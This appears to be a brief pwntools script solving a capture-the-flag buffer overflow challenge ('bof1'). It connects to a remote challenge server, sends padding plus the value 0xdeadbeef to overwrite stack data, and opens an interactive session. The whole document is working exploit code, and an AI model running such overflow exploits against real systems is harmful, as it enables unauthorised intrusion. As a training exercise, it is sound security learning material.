from pwn import *

# p = process('./bof1')
p = connect('45.77.39.59', 10002)

payload = b'A'*0x3c
payload += p64(0xdeadbeef)

p.recvuntil(b'>')
p.sendline(payload)

p.interactive()